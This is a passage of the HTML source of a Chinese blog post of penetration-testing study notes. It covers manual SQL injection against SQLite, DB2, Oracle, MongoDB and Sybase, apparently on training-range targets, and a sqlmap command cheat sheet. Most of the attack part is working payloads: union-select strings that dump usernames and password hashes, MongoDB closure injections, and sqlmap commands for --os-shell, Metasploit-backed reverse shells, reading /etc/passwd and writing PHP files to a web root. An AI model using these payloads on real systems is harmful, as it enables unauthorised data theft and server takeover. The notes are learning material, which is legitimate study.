+<li><p>获取所有的列名：<a target="_blank" rel="noopener" href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,column_name,null from information_schema.columns where table_name=’reg_users’     limit 1 offset 0</p>
+<ul>
+<li>获取到的列名：id  name  password  status</li>
+</ul>
+</li>
+<li><p>获取账号和密码：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,name,null from reg_users  获取到账号为：mozhe2</li>
+<li><a target="_blank" rel="noopener" href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,password,null from reg_users获取到的密码为：1c63129ae9db9c60c3e8aa94d3e00495  解密后值为：1c63129ae9db9c60c3e8aa94d3e00495</li>
+<li><img src="/source/images/image-20210729154748904.png" alt="image-20210729154748904"></li>
+<li><img src="/source/images/image-20210729154740600.png" alt="image-20210729154740600"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="14-、SQLite-amp-Mongodb-amp-Oracle-amp-DB2"><a href="#14-、SQLite-amp-Mongodb-amp-Oracle-amp-DB2" class="headerlink" title="14 、SQLite&amp;Mongodb&amp;Oracle&amp;DB2"></a>14 、SQLite&amp;Mongodb&amp;Oracle&amp;DB2</h2><p>#案例1-SQLite注入</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/5760321.html">https://www.cnblogs.com/xiaozi/p/5760321.html</a></p>
+<p>通常sqlite文件中会包含一个sqlite_master隐藏表</p>
+<p>​    <img src="/source/images/image-20210729164800102.png" alt="image-20210729164800102"></p>
+<p>这里记录着你建表留下的记录，我们可以查看这个表名来看这些数据，比如通过上面的图片我们可以发现存在Test表和字段id,name两个字段</p>
+<p>那么怎么查询数据呢？</p>
+<ul>
+<li>首先查询字段长度：order by 4</li>
+<li>联合查询爆出显示位   union select 1,2,3,4</li>
+<li>在显示位插入查询语句：union select 1,name,sql,4 from sqlite_master<ul>
+<li>可以看到，通过查询sqlite_master隐藏表里的字段name和sql即可获取该数据库里的表的名字Test和该Test表下的字段id，name</li>
+</ul>
+</li>
+<li>获取账号和密码：union select 1,name,password,4 from WSTMart_reg     <ul>
+<li>这里的name和password就是从sqlite_master隐藏表的字段sql里查询得到的，WSTMart_reg    则是从隐藏表sqlite_master的字段name里查到的</li>
+</ul>
+</li>
+</ul>
+<p>#案例2-DB2联合注入</p>
+<ul>
+<li>特性：和mysql大致类似，只是一些名称不一样，有一个</li>
+</ul>
+<p>tabschema：数据库名 current schema：数据库名的列名</p>
+<p>table_name：表名 tabname：表名的列名</p>
+<p>column_name：列名的列名</p>
+<p>sysibm.sysdummy1 记录数据库名的信息</p>
+<p>syscat.tables：记录表名的信息</p>
+<p>sysibm.columns：记录列名的信息</p>
+<p>1、猜数</p>
+<p>order by 4</p>
+<p>union select 1,2,3,4 from sysibm.systables</p>
+<ul>
+<li>易错点：在爆显示位的时候必须要加上后面的sysibm.systables  才能爆出显示位</li>
+</ul>
+<p>2、爆库：</p>
+<p>union select 1,2,current schema,4 from sysibm.sysdummy1</p>
+<p>3、爆表：</p>
+<p>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 0,1</p>
+<p>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 1,1</p>
+<p>4、爆列：</p>
+<p>union select 1,2,column_name,4 from sysibm.columns where table_schema=current schema and table_name=’GAME_CHARACTER’ limit 0,1</p>
+<ul>
+<li>易错点：之所以加一个将数据库名加上，就是为了防止多个数据库有相同的表名，防止数据魂断</li>
+</ul>
+<p>5、爆数据：</p>
+<p>union select 1,name,password,4 from GAME_CHARACTER limit 0,1</p>
+<p>union select 1,name,password,4 from GAME_CHARACTER limit 1,1</p>
+<ul>
+<li>查询表GAME_CHARACTER里的账号和密码</li>
+</ul>
+<p>#案例3-Oracle联合注入</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35569814/article/details/100517122">https://blog.csdn.net/qq_35569814/article/details/100517122</a></p>
+<p>all_tables 查询出所有的表</p>
+<p>user_tables 查询出当前用户的表</p>
+<p>all_tab_columns 查询出所有的字段</p>
+<p>user_tab_columns  查询出当前用户的字段</p>
+<p>v$version 查版本</p>
+<p>1.查询个数</p>
+<p>order by 2</p>
+<p>2.查询表名格式</p>
+<ul>
+<li>易错点：<ul>
+<li>可以是数字1,2,3等，也可以是null</li>
+<li>需要先判断null是数字类型还是字符类型<ul>
+<li>首先将第一个null用单引号引起来，’null’，如果页面正常，则是字符型，如果页面错误，则是数字型</li>
+<li>如果第一个null是字符型<ul>
+<li>那么就开始测第二个null，同时第一个null还是用单引号引起来’null’，在测第二个null，将第二个null用单引号引起来，看他是不是字符型，如果是，则继续用单引号引起来，以此类推<ul>
+<li>union select ‘null’,’null’ from dual    此处如果页面正常，那么两个null都是字符型，必须都要用单引号引起来</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>如果第一个null是数字型<ul>
+<li>那么第一个null则不需要单引号，开始测第二个null，首先加单引号，如果页面正常，则第二个null要用单引号引起来，则最终的语句是：union select null,’null’ from dual</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>union select null,null from dual    #两个null都是数字型</p>
+<p>union select ‘null’,null from dual   #第一个null是字符型，第二个null是数字型</p>
+<p>union select ‘null’,’null’ from dual    #两个null都是数字型</p>
+<p>3.查询获取表名(筛选,搜索)</p>
+<p>union select ‘1’,(select table_name from user_tables where rownum=1) from dual</p>
+<ul>
+<li>获取表名</li>
+</ul>
+<p>union select ‘1’,(select table_name from user_tables where rownum=1 and table_name not in ‘LOGMNR_SESSION_EVOLVE$’) from dual</p>
+<ul>
+<li>获取和第一个表不一样的表名，通过and 和not in来逐个爆出来</li>
+</ul>
+<p>union select ‘1’,(select table_name from user_tables where rownum=1 and table_name like ‘%user%’) from dual</p>
+<ul>
+<li>获取表名，并且该表名里有关键字：user</li>
+</ul>
+<p>4.查询获取列名</p>
+<p>union select ‘1’,(select column_name from user_tab_columns where rownum=1 and table_name=’sns_users’) from dual</p>
+<ul>
+<li>获取表sns_user所对应的字段</li>
+</ul>
+<p>union select ‘1’,(select column_name from user_tab_columns where rownum=1 and table_name=’sns_users’ and column_name not in ‘USER_NAME’)  from dual</p>
+<ul>
+<li>获取表sns_user所对应的字段，并且该字段能是上一个句子爆出来的字段，通过此方法遍历所有的字段</li>
+</ul>
+<p>5.获取指定表名列名数据</p>
+<p>union select user_name,user_pwd from “sns_users”</p>
+<ul>
+<li>获取账号和密码，假设获取到的账号为  hu</li>
+</ul>
+<p>union select user_name,user_pwd from “sns_users” where user_name&lt;&gt;’hu’</p>
+<ul>
+<li>获取账号不为 hu  的其余的账号和密码，   &lt;&gt;   的意思是不等于的意思</li>
+</ul>
+<p>union select user_name,user_pwd from “sns_users” where user_name=’mozhe’</p>
+<ul>
+<li>获取账号为 mozhe的的密码</li>
+</ul>
+<p>#案例4-Mongodb闭合注入</p>
+<ul>
+<li><p>应用场景：一般应用于ctf或者python开发的web环境中</p>
+</li>
+<li><p>特性：返回的是json的格式,sqlmap不支持该数据库</p>
+</li>
+<li><p>注入步骤</p>
+<p>1.获取回显数字</p>
+<p>‘}); return ({title:1,content:’2</p>
+<ul>
+<li><p>因为Mongodb和其他数据库的格式不一样，需要闭合</p>
+<ul>
+<li><p>如果不闭合，我们的语句会被当做字符串</p>
+<ul>
+<li><img src="/source/images/image-20210729174705548.png" alt="image-20210729174705548"></li>
+</ul>
+</li>
+<li><p>闭合后的效果：</p>
+<ul>
+<li><img src="/source/images/image-20210729174730745.png" alt="image-20210729174730745"></li>
+</ul>
+</li>
+<li><p>查询语句只需要插在回显位置即可，比如上图中的回显位置就在1那里</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>2.爆库</p>
+<p>db返回的是数组，库名，需要用tojson转换为字符串</p>
+<p>‘}); return ({title:tojson(db),content:’2</p>
+<ul>
+<li>查询数据库名</li>
+</ul>
+<p>3.爆表</p>
+<p>db.getCollectionNames()返回的是数组，需要用tojson转换为字符串</p>
+<p>‘}); return ({title:tojson(db.getCollectionNames()),content:’2</p>
+<ul>
+<li>db.getCollectionNames()代表获取该数据库的所有表，这里获取到的是Authority_confidential表</li>
+</ul>
+<p>4.爆列及数据</p>
+<p>db.Authority_confidential是当前用的集合（表），</p>
+<p>find函数用于查询，0是第一条数据</p>
+<p>‘}); return ({title:tojson(db.Authority_confidential.find()[0]),content:’1</p>
+<ul>
+<li>获取当前数据库的Authority_confidential表的字段，查找第一个字段，find()[0]</li>
+</ul>
+<p>‘}); return ({title:tojson(db.Authority_confidential.find()[1]),content:’1</p>
+<ul>
+<li>获取当前数据库的Authority_confidential表的字段，查找第2个字段，find()[1]</li>
+</ul>
+</li>
+</ul>
+<h2 id="15-、Sybase-amp-Mssql-amp-Sqlmap-amp-Tamper"><a href="#15-、Sybase-amp-Mssql-amp-Sqlmap-amp-Tamper" class="headerlink" title="15 、Sybase&amp;Mssql&amp;Sqlmap&amp;Tamper"></a>15 、Sybase&amp;Mssql&amp;Sqlmap&amp;Tamper</h2><p>案例1-SQL注入-Sybase手工联合注入</p>
+<ul>
+<li>```python<br>1.猜个数<br>order by 4<br>2.猜显位:从第一个null开始给他用单引号引起来，如果显示正常，则代表第一个null是显示位，如果不正常，那么去掉第一个null的单引号，将第二个null引起来，然后观察页面是否正常，依此类推。。。<br>注意事项：<pre><code>1、整个union语句中，只能存在一个被单引号引起来的null
+2、union和select之间有一个all，千万不能少
+</code></pre>
+union all select ‘null’,null,null,null<br>union all select null,’null’,null,null 显示null证明显示位为2<br>union all select null,null,’null’,null<br>union all select null,null,null,’null’<br>3.猜库名<br>union all select null,db_name(),null,null<br>union all select null,db_name(1),null,null<br>union all select null,db_name(2),null,null<br>4.猜表名：这里的mozhe_Deepthroat是上一步获取到的数据库名，而  .dbo.sysobjects 是固定搭配，这里面储存着所有的表<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;’Deepthroat_login’<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;’Deepthroat_login’ and name&lt;&gt;’notice’<br>5.猜列名：注意，才列名的时候，填充在null的位置的关键字也是name，而 .dbo.syscolumns 里储存了所有的列<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.syscolumns where id=object_id(‘Deepthroat_login’)  #此处是通过id=object_id(‘Deepthroat_login’) 来对条件进行限定，就是只获取表Deepthroat_login里的列<br>union all select null,name,null,null from mozhe_Deepthroat.syscolumns where id=object_id(‘Deepthroat_login’) and name&lt;&gt;’id’<br>union all select null,name,null,null from mozhe_Deepthroat.syscolumns where id=object_id(‘Deepthroat_login’) and name&lt;&gt;’id’ and name&lt;&gt;’name’    #这里的  &lt;&gt;代表不等于，表示获取表Deepthroat_login里的字段，并且要求该字段不为 id 和 name<br>6.获取数据<br>union all select null,name,null,null from Deepthroat_login    #此处的name是上一步获取到的字段 name<br>union all select null,password,null,null from Deepthroat_login<br>union all select null,password,null,null from Deepthroat_login where name&lt;&gt;’zhang’   #获取除了账号zhang之外的密码<br>union all select null,password,null,null from Deepthroat_login where name=’mozhe’<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例2-SQLMAP-下载&amp;安装&amp;使用&amp;说明</span><br><span class="line"></span><br><span class="line">https://www.python.org/downloads/</span><br><span class="line"></span><br><span class="line">https://github.com/sqlmapproject/sqlmap</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_21500173/article/details/53648696</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例3-SQLMAP-Sybase&amp;Mysql&amp;SQLite</span><br><span class="line"></span><br><span class="line">sqlmap基础命令讲解：</span><br><span class="line"></span><br><span class="line">- 易错点：如果在用sqlmap注入一个网站，发现换了一个目标识别出了数据库名字，并且该名字和上一次的结果一样，但是当执行--tables的时候又是500错误，那么可能就是缓存的原因了，需要删除缓存再开始注入，缓存文件地址：C:\Users\painter\AppData\Local\sqlmap\output     直接将output目录下的文件夹删除即可</span><br><span class="line">  - ![image-20210730112640774](/source/images/image-20210730112640774.png)</span><br><span class="line"></span><br><span class="line">- </span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">	#SQLMAP基本操作笔记：</span><br><span class="line">-u  #注入点 </span><br><span class="line">-f  #指纹判别数据库类型 </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #指定数据库名 </span><br><span class="line">-T &quot;&quot;  #指定表名 </span><br><span class="line">-C &quot;&quot;  #指定字段 </span><br><span class="line">-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line">--columns        #列出字段 </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line">-U               #指定数据库用户 </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;#列出mysql数据库中的user表的所有字段</span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="line">--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #指定系统(Linux,Windows) </span><br><span class="line">-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    1：显示信息和警告消息。 </span><br><span class="line">    2：显示调试消息。 </span><br><span class="line">    3：有效载荷注入。 </span><br><span class="line">    4：显示HTTP请求。 </span><br><span class="line">    5：显示HTTP响应头。 </span><br><span class="line">    6：显示HTTP响应页面的内容 </span><br><span class="line">--privileges  #查看权限 </span><br><span class="line">--is-dba      #是否是数据库管理员 </span><br><span class="line">--roles       #枚举数据库用户角色 </span><br><span class="line">--udf-inject  #导入用户自定义函数（获取系统权限） </span><br><span class="line">--union-check  #是否支持union 注入 </span><br><span class="line">--union-cols #union 查询表记录 </span><br><span class="line">--union-test #union 语句测试 </span><br><span class="line">--union-use  #采用union 注入 </span><br><span class="line">--union-tech orderby #union配合order by </span><br><span class="line">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) --referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="line">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="line">--threads 　　  #采用多线程(--threads 3) </span><br><span class="line">--sql-shell    #执行指定sql命令 </span><br><span class="line">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #读取指定文件 </span><br><span class="line">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="line">--file-dest    #要写入的文件绝对路径 </span><br><span class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell </span><br><span class="line">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #读取win系统注册表 </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="line">--eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-default-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br><span class="line">常用语句 :</span><br><span class="line">1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 </span><br><span class="line">2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span><br><span class="line">3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span><br><span class="line">4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span><br><span class="line">5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span><br><span class="line">6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 </span><br><span class="line">7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span><br><span class="line">8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 </span><br><span class="line">9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span><br><span class="line">10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span><br><span class="line">11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span><br><span class="line">14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta </span><br><span class="line">15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="line">19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 </span><br><span class="line">20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner </span><br><span class="line">21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;简单的注入流程 :</span><br><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+<ul>
+<li><pre><code class="python">Sqlmap-Sybase 注入
+--dbs       #获取所有数据库名                    
+--current-db    #获取当前数据库
+--tables -D &quot;mozhe_Deepthroat&quot;     #跑表
+--columns -D &quot;mozhe_Deepthroat&quot; -T Deepthroat_login   #跑字段
+--dump -C &quot;name,password&quot; -D &quot;mozhe_Deepthroat&quot; -T Deepthroat_login     #获取数据
+Sqlmap-Mysql
+--dbs                        
+--current-db                                            
+--tables -D mozhe_Discuz_StormGroup
+--columns -T StormGroup_member -D mozhe_Discuz_StormGroup
+--dump -C &quot;name,password&quot; -T StormGroup_member -D mozhe_Discuz_StormGroup
+
+Sqlmap-SQLite
+#注意事项：因为sqlite只有一个数据库，所以直接开始获取tables即可
+--tables
+--columns -T WSTMart_reg
+--dump -C &quot;name,password&quot; -T WSTMart_reg
+</code></pre>
+</li>
+</ul>
+<p>#案例4-引出实战-编码性注入手工及工具测试</p>
+<p>手工：</p>
+<ul>
+<li>首先要对加密的参数进行解密</li>
+<li>再解密后的参数的值后面拼接sql语句</li>
+<li>接着对拼接的sql语句进行加密</li>
+<li>将加密后的语句拼接到url里进行执行</li>
+</ul>
+<p>工具：</p>
+<ul>
+<li>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://xxxx/?id=*&quot;">http://xxxx?id=*&quot;</a> –tamper=base64encode.py</li>
+</ul>
+<p>sqlmap的目录结构</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_21500173/article/details/53648696">sqlmap 的源码学习笔记一之目录结构_这块盾牌有待改良-CSDN博客</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/10/9-12%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-xiaodi/" rel="prev" title="9-12、渗透测试学习笔记(xiaodi)">
+      <i class="fa fa-chevron-left"></i> 9-12、渗透测试学习笔记(xiaodi)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/10/15-20%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" rel="next" title="16-20、渗透测试(xiaodi)">
+      16-20、渗透测试(xiaodi) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
